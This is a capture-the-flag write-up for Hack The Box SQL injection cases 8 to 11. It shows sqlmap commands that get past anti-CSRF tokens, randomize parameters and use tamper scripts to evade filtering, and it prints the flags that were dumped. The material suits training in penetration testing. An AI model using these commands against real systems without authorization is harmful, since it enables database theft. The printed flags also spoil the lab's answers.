## Challenge 1

What's the contents of table flag8? (Case #8) 

## Solution 1

The description here is `Detect and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection
(Note: non-standard token name is used)`.

Since it is a post request, I open the page using BURP, and save the request to a file.

I see that the token is written as follows:

```http
id=1&t0ken=w3kvfr3QvnlbjqaSxRrWYknHzzt1ouNmc0Ib3I4YM
```

So this tells me that the parameter name for the token is `t0ken` which I will use in the SQLMap, by executing the following:

```sh
python3 sqlmap.py -r ../../case8.txt -p id --csrf-token="t0ken" --dump
```

This has provided me with the answer:

```sh
+----+-----------------------------------+
| id | content                           |
+----+-----------------------------------+
| 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
+----+-----------------------------------+
```

## Challenge 2

What's the contents of table flag9? (Case #9) 

## Solution 2

The description is `Detect and exploit SQLi vulnerability in GET parameter id, while taking care of the unique uid`.

And when I click on the link to execute the query, it sends me to a link `http://94.237.54.190:48195/case9.php?id=1&uid=1549169685`.

So, I will attack it by randomizing the `uid`, by executing the following:

```sh
python3 sqlmap.py -u "http://94.237.54.190:48195/case9.php?id=1&uid=1549169685" -p id --randomize=uid --dump
```

This has provided me with the flag:

```sh
+----+---------------------------------------+
| id | content                               |
+----+---------------------------------------+
| 1  | HTB{700_much_r4nd0mn355_f0r_my_74573} |
+----+---------------------------------------+
```

## Challenge 3

What's the contents of table flag10? (Case #10) 

## Solution

Since it's POST request, open it in Burp and save it as a file.

Then start SQLMap on this file:

```sh
python3 sqlmap.py -r ../../case10 -p id --dump --batch
```

And you will get the flag, which is:

```sh
HTB{y37_4n07h3r_r4nd0m1z3}
```

## Challenge 4

What's the contents of table flag11? (Case #11) 

## Solution 4

The description is that it is a `Filtering of characters '<', '>'` and that `Detect and exploit SQLi vulnerability in GET parameter id`.

So this means I have to use some tamper scripts, particularly the `between` one.

I executed the following:

```sh
python3 sqlmap.py -u "http://94.237.54.190:48195/case11.php?id=1" -p id -T flag11 -D testdb --tamper=between --dump

```

This has provided with the flag:

```sh
+----+----------------------------+
| id | content                    |
+----+----------------------------+
| 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
+----+----------------------------+
```


